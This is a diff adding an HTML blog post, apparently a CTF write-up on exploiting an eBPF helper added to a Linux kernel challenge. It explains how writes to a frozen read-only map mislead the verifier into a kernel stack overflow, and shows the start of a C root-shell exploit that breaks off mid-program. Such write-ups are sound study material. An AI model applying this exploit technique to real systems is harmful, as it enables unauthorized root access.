@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
+    <title>aliyun 2025 beebee</title>
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <nav class="site-nav">
+            <a href="./index.html" class="nav-link">/home</a>
+            <span class="nav-separator">|</span>
+            <a href="./about.html" class="nav-link">/about</a>
+        </nav>
+        <div class="terminal-prompt">
+            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">lab</span> <span style="color:#83a598"><a href="./index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
+            <span class="cmd">cat ./aliyun 2025 beebee.md</span><span class="cursor">█</span>
+        </div>
+        <h1 class="post-title">aliyun 2025 beebee</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2025-04-18]</div>
+    </header>
+    <div class="layout-grid">
+                <main><h2 id="ti-mu">题目</h2><p>给了config和patch文件</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">diff --color -ruN origin/include/linux/bpf.h aliyunctf/include/linux/bpf.h
+</span><span style="color:#c0c5ce;">--- origin/include/linux/bpf.h	2025-01-23 10:21:19.000000000 -0600
+</span><span style="color:#c0c5ce;">+++ aliyunctf/include/linux/bpf.h	2025-01-24 03:44:01.494468038 -0600
+</span><span style="color:#c0c5ce;">@@ -3058,6 +3058,7 @@
+</span><span style="color:#c0c5ce;"> extern const struct bpf_func_proto bpf_user_ringbuf_drain_proto;
+</span><span style="color:#c0c5ce;"> extern const struct bpf_func_proto bpf_cgrp_storage_get_proto;
+</span><span style="color:#c0c5ce;"> extern const struct bpf_func_proto bpf_cgrp_storage_delete_proto;
+</span><span style="color:#a3be8c;">+extern const struct bpf_func_proto bpf_aliyunctf_xor_proto;
+</span><span style="color:#c0c5ce;"> 
+</span><span style="color:#c0c5ce;"> const struct bpf_func_proto *tracing_prog_func_proto(
+</span><span style="color:#c0c5ce;">   enum bpf_func_id func_id, const struct bpf_prog *prog);
+</span><span style="color:#c0c5ce;">diff --color -ruN origin/include/uapi/linux/bpf.h aliyunctf/include/uapi/linux/bpf.h
+</span><span style="color:#c0c5ce;">--- origin/include/uapi/linux/bpf.h	2025-01-23 10:21:19.000000000 -0600
+</span><span style="color:#c0c5ce;">+++ aliyunctf/include/uapi/linux/bpf.h	2025-01-24 03:44:11.814636836 -0600
+</span><span style="color:#c0c5ce;">@@ -5881,6 +5881,7 @@
+</span><span style="color:#c0c5ce;"> 	FN(user_ringbuf_drain, 209, ##ctx)		\
+</span><span style="color:#c0c5ce;"> 	FN(cgrp_storage_get, 210, ##ctx)		\
+</span><span style="color:#c0c5ce;"> 	FN(cgrp_storage_delete, 211, ##ctx)		\
+</span><span style="color:#a3be8c;">+	FN(aliyunctf_xor, 212, ##ctx)		\
+</span><span style="color:#c0c5ce;"> 	/* */
+</span><span style="color:#c0c5ce;"> 
+</span><span style="color:#c0c5ce;"> /* backwards-compatibility macros for users of __BPF_FUNC_MAPPER that don&#39;t
+</span><span style="color:#c0c5ce;">diff --color -ruN origin/kernel/bpf/helpers.c aliyunctf/kernel/bpf/helpers.c
+</span><span style="color:#c0c5ce;">--- origin/kernel/bpf/helpers.c	2025-01-23 10:21:19.000000000 -0600
+</span><span style="color:#c0c5ce;">+++ aliyunctf/kernel/bpf/helpers.c	2025-01-24 03:44:06.683490095 -0600
+</span><span style="color:#c0c5ce;">@@ -1745,6 +1745,28 @@
+</span><span style="color:#c0c5ce;"> 	.arg3_type	= ARG_CONST_ALLOC_SIZE_OR_ZERO,
+</span><span style="color:#c0c5ce;"> };
+</span><span style="color:#c0c5ce;"> 
+</span><span style="color:#a3be8c;">+BPF_CALL_3(bpf_aliyunctf_xor, const char *, buf, size_t, buf_len, s64 *, res) {
+</span><span style="color:#a3be8c;">+	s64 _res = 2025;
+</span><span style="color:#a3be8c;">+
+</span><span style="color:#a3be8c;">+	if (buf_len != sizeof(s64))
+</span><span style="color:#a3be8c;">+		return -EINVAL;
+</span><span style="color:#a3be8c;">+
+</span><span style="color:#a3be8c;">+	_res ^= *(s64 *)buf;
+</span><span style="color:#a3be8c;">+	*res = _res;
+</span><span style="color:#a3be8c;">+
+</span><span style="color:#a3be8c;">+	return 0;
+</span><span style="color:#a3be8c;">+}
+</span><span style="color:#a3be8c;">+
+</span><span style="color:#a3be8c;">+const struct bpf_func_proto bpf_aliyunctf_xor_proto = {
+</span><span style="color:#a3be8c;">+	.func		= bpf_aliyunctf_xor,
+</span><span style="color:#a3be8c;">+	.gpl_only	= false,
+</span><span style="color:#a3be8c;">+	.ret_type	= RET_INTEGER,
+</span><span style="color:#a3be8c;">+	.arg1_type	= ARG_PTR_TO_MEM | MEM_RDONLY,
+</span><span style="color:#a3be8c;">+	.arg2_type	= ARG_CONST_SIZE,
+</span><span style="color:#a3be8c;">+	.arg3_type	= ARG_PTR_TO_FIXED_SIZE_MEM | MEM_UNINIT | MEM_ALIGNED | MEM_RDONLY,
+</span><span style="color:#a3be8c;">+	.arg3_size	= sizeof(s64),
+</span><span style="color:#a3be8c;">+};
+</span><span style="color:#a3be8c;">+
+</span><span style="color:#c0c5ce;"> const struct bpf_func_proto bpf_get_current_task_proto __weak;
+</span><span style="color:#c0c5ce;"> const struct bpf_func_proto bpf_get_current_task_btf_proto __weak;
+</span><span style="color:#c0c5ce;"> const struct bpf_func_proto bpf_probe_read_user_proto __weak;
+</span><span style="color:#c0c5ce;">@@ -1801,6 +1823,8 @@
+</span><span style="color:#c0c5ce;"> 		return &amp;bpf_strtol_proto;
+</span><span style="color:#c0c5ce;"> 	case BPF_FUNC_strtoul:
+</span><span style="color:#c0c5ce;"> 		return &amp;bpf_strtoul_proto;
+</span><span style="color:#a3be8c;">+	case BPF_FUNC_aliyunctf_xor:
+</span><span style="color:#a3be8c;">+		return &amp;bpf_aliyunctf_xor_proto;
+</span><span style="color:#c0c5ce;"> 	default:
+</span><span style="color:#c0c5ce;"> 		break;
+</span><span style="color:#c0c5ce;"> 	}
+</span></pre>
+<p>patch和反向patch</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">patch -p1 &lt; ../../bee/aliyunctf.patch
+</span><span style="color:#c0c5ce;">patch -p1 -R &lt; ../../bee/aliyunctf.patch
+</span></pre>
+<p>加了一个ebpf helper函数<code>BPF_FUNC_aliyunctf_xor</code>
+将_res和传入的值做异或，并将结果存入传入参数res指向的内存</p>
+<p><code>bpf_aliyunctf_xor_proto</code>规定了传入参数要求</p>
+<p><code>ARG_PTR_TO_MEM</code>  指向合法内存（eBPF栈、skb、map值）的指针
+<code>ARG_PTR_TO_FIXED_SIZE_MEM</code>  指向固定大小内存的指针</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">enum </span><span style="color:#c0c5ce;">bpf_arg_type {
+</span><span style="color:#c0c5ce;">	...
+</span><span style="color:#c0c5ce;">	ARG_PTR_TO_MEM,		</span><span style="color:#65737e;">/* pointer to valid memory (stack, packet, map value) */
+</span><span style="color:#c0c5ce;">	...
+</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* Pointer to valid memory of size known at compile time. */
+</span><span style="color:#c0c5ce;">	ARG_PTR_TO_FIXED_SIZE_MEM	= MEM_FIXED_SIZE | ARG_PTR_TO_MEM,
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<p>限制辅助函数的参数：</p>
+<ul>
+<li>arg1 为指向只读内存的指针</li>
+<li>arg2 常数</li>
+<li>arg3 指向固定大小（8字节）、未初始化、对齐且只读区域的内存指针</li>
+</ul>
+<h2 id="li-yong-fen-xi">利用分析</h2><p>判断map是否只读 两个条件：</p>
+<ul>
+<li>map_flags为BPF_F_RDONLY_PROG</li>
+<li>map-&gt;frozen为真</li>
+</ul>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">static bool </span><span style="color:#8fa1b3;">bpf_map_is_rdonly</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> bpf_map *</span><span style="color:#bf616a;">map</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* A map is considered read-only if the following condition are true:
+</span><span style="color:#65737e;">	 *
+</span><span style="color:#65737e;">	 * 1) BPF program side cannot change any of the map content. The
+</span><span style="color:#65737e;">	 *    BPF_F_RDONLY_PROG flag is throughout the lifetime of a map
+</span><span style="color:#65737e;">	 *    and was set at map creation time.
+</span><span style="color:#65737e;">	 * 2) The map value(s) have been initialized from user space by a
+</span><span style="color:#65737e;">	 *    loader and then &quot;frozen&quot;, such that no new map update/delete
+</span><span style="color:#65737e;">	 *    operations from syscall side are possible for the rest of
+</span><span style="color:#65737e;">	 *    the map&#39;s lifetime from that point onwards.
+</span><span style="color:#65737e;">	 * 3) Any parallel/pending map update/delete operations from syscall
+</span><span style="color:#65737e;">	 *    side have been completed. Only after that point, it&#39;s safe to
+</span><span style="color:#65737e;">	 *    assume that map value(s) are immutable.
+</span><span style="color:#65737e;">	 */
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">(map-&gt;map_flags &amp; BPF_F_RDONLY_PROG) &amp;&amp;
+</span><span style="color:#c0c5ce;">	       </span><span style="color:#8fa1b3;">READ_ONCE</span><span style="color:#c0c5ce;">(map-&gt;frozen) &amp;&amp;
+</span><span style="color:#c0c5ce;">	       !</span><span style="color:#8fa1b3;">bpf_map_write_active</span><span style="color:#c0c5ce;">(map);
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<ul>
+<li>BFP程序侧不能更改任何map内容。<code>BPF_F_RDONLY_PROG</code>flag贯穿map整个生命周期，并在创建map时设置</li>
+<li>map值已经被loader从用户空间初始化，然后被frozen，这样在map剩余生命周期中，系统调用端不可能进行新的map更新/删除操作</li>
+<li>系统调用端所有并行/挂起的map更新/删除操作已完成。只有在这点之后，才可以安全地假设map值不可变</li>
+</ul>
+<p>bpf命令<code>BPF_MAP_FREEZE</code>，设置<code>map-&gt;frozen</code>为真</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">map_freeze</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const union</span><span style="color:#c0c5ce;"> bpf_attr *</span><span style="color:#bf616a;">attr</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">	...
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">WRITE_ONCE</span><span style="color:#c0c5ce;">(map-&gt;frozen, </span><span style="color:#d08770;">true</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	...
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> err;
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<p>当先创建一个<code>BPF_F_RDONLY_PROG</code>属性的map，再freeze它，能将该map变为read-only
+但这只是作为eBPF程序的一种标记 并没有在物理内存上设置为只读</p>
+<p>读写操作会使用<code>check_mem_access()</code>检查内存
+读取read-only属性map中值到寄存器中，此处<code>value_regno</code>指向dst_reg，读取操作会直接根据map中的值设置该寄存器 并标记为标量
+这之后即使用漏洞函数修改map中存储的值，但verifier不会跟踪到这一点，从而仍然会认为加载的是一个小的固定值</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">check_mem_access</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_verifier_env *</span><span style="color:#bf616a;">env</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">insn_idx</span><span style="color:#c0c5ce;">, u32 </span><span style="color:#bf616a;">regno</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">			    </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">off</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">bpf_size</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">enum</span><span style="color:#c0c5ce;"> bpf_access_type </span><span style="color:#bf616a;">t</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">			    </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">value_regno</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">bool </span><span style="color:#bf616a;">strict_alignment_once</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">bool </span><span style="color:#bf616a;">is_ldsx</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(reg-&gt;type == PTR_TO_MAP_KEY) {
+</span><span style="color:#c0c5ce;">		...
+</span><span style="color:#c0c5ce;">	} </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(reg-&gt;type == PTR_TO_MAP_VALUE) {
+</span><span style="color:#c0c5ce;">		...
+</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(kptr_field) {
+</span><span style="color:#c0c5ce;">			...
+</span><span style="color:#c0c5ce;">		} </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(t == BPF_READ &amp;&amp; value_regno &gt;= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *map = reg-&gt;map_ptr;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">			</span><span style="color:#65737e;">/* if map is read-only, track its contents as scalars */
+</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">tnum_is_const</span><span style="color:#c0c5ce;">(reg-&gt;var_off) &amp;&amp;
+</span><span style="color:#c0c5ce;">			    </span><span style="color:#8fa1b3;">bpf_map_is_rdonly</span><span style="color:#c0c5ce;">(map) &amp;&amp;
+</span><span style="color:#c0c5ce;">			    map-&gt;ops-&gt;map_direct_value_addr) {
+</span><span style="color:#c0c5ce;">				</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> map_off = off + reg-&gt;var_off.</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">				u64 val = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">				err = </span><span style="color:#8fa1b3;">bpf_map_direct_read</span><span style="color:#c0c5ce;">(map, map_off, size,
+</span><span style="color:#c0c5ce;">							  &amp;val, is_ldsx);
+</span><span style="color:#c0c5ce;">				</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(err)
+</span><span style="color:#c0c5ce;">					</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> err;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">				regs[value_regno].</span><span style="color:#bf616a;">type </span><span style="color:#c0c5ce;">= SCALAR_VALUE;
+</span><span style="color:#c0c5ce;">				</span><span style="color:#8fa1b3;">__mark_reg_known</span><span style="color:#c0c5ce;">(&amp;regs[value_regno], val);
+</span><span style="color:#c0c5ce;">			} </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">				</span><span style="color:#8fa1b3;">mark_reg_unknown</span><span style="color:#c0c5ce;">(env, regs, value_regno);
+</span><span style="color:#c0c5ce;">			}
+</span><span style="color:#c0c5ce;">		}
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">	...
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<p>最后使用一个套路的利用方法，通过构造verifier未检测出的大值，作为<code>bpf_skb_load_bytes()</code>函数的第三个长度参数，将参数to设置为栈地址，造成栈溢出</p>
+<blockquote>
+<p>设置参数to时，需要将REG10栈地址-0x8，REG10即rbp，不能直接作为参数to</p>
+</blockquote>
+<pre style="background-color:#2b303b;">
+<span style="color:#8fa1b3;">BPF_CALL_4</span><span style="color:#c0c5ce;">(bpf_skb_load_bytes, </span><span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> sk_buff *, skb, u32, offset,
+</span><span style="color:#c0c5ce;">	   </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*, to, u32, len)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*ptr;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">unlikely</span><span style="color:#c0c5ce;">(offset &gt; INT_MAX))
+</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> err_clear;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	ptr = </span><span style="color:#8fa1b3;">skb_header_pointer</span><span style="color:#c0c5ce;">(skb, offset, len, to);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">unlikely</span><span style="color:#c0c5ce;">(!ptr))
+</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> err_clear;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(ptr != to)
+</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(to, ptr, len);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">err_clear:
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(to, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, len);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EFAULT;
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<p>另外<code>bpf_skb_load_bytes</code>要求了第四个参数类型为<code>ARG_CONST_SIZE</code>
+正好从read-only map中获取存到寄存器时寄存器类型会被设置为<code>SCALE_VALUE</code> 从而满足const要求</p>
+<blockquote>
+<p>?没找到源码具体在哪判断的呢？</p>
+</blockquote>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">static const struct</span><span style="color:#c0c5ce;"> bpf_func_proto bpf_skb_load_bytes_proto = {
+</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">func		</span><span style="color:#c0c5ce;">= bpf_skb_load_bytes,
+</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">gpl_only	</span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">false</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">ret_type	</span><span style="color:#c0c5ce;">= RET_INTEGER,
+</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">arg1_type	</span><span style="color:#c0c5ce;">= ARG_PTR_TO_CTX,
+</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">arg2_type	</span><span style="color:#c0c5ce;">= ARG_ANYTHING,
+</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">arg3_type	</span><span style="color:#c0c5ce;">= ARG_PTR_TO_UNINIT_MEM,
+</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">arg4_type	</span><span style="color:#c0c5ce;">= ARG_CONST_SIZE,
+</span><span style="color:#c0c5ce;">};
+</span></pre>
+<h2 id="exp">exp</h2><pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">_GNU_SOURCE
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sched.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/prctl.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">bpf_tools.h</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">BPF_FUNC_aliyunctf_xor </span><span style="color:#d08770;">212
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">MAP_SIZE </span><span style="color:#d08770;">8
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">msg</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[31m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[x] Error at: </span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#d08770;">%s</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, msg);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">sleep</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(EXIT_FAILURE);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">/* root checker and shell poper */
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">get_root_shell</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] Checking for root...</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">getuid</span><span style="color:#c0c5ce;">()) {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[31m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[x] Failed to get the root!</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">sleep</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(EXIT_FAILURE);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[32m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[+] Successful to get the root. </span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[34m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[*] Execve root shell now...</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">system</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/* to exit the process normally, instead of segmentation fault */
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(EXIT_SUCCESS);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">(){
+</span><span style="color:#c0c5ce;">  
+</span><span style="color:#c0c5ce;">  size_t value[</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> array_map_fd = </span><span style="color:#8fa1b3;">bpf_map_create_rdonly</span><span style="color:#c0c5ce;">(BPF_MAP_TYPE_ARRAY, </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">, MAP_SIZE, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">); 
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(array_map_fd &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to create eBPF map!</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> key = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">  value[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">bpf_map_update_elem</span><span style="color:#c0c5ce;">(array_map_fd, &amp;key, &amp;value, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to load value into map!</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">bpf_map_freeze</span><span style="color:#c0c5ce;">(array_map_fd) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to freeze map!</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_insn prog[] = {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// R8 CTX
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(BPF_REG_8, BPF_REG_1),
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// get ptr pointed to read-only map, stored in reg_6
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">BPF_READ_ARRAY_MAP_IDX</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, array_map_fd, BPF_REG_3),
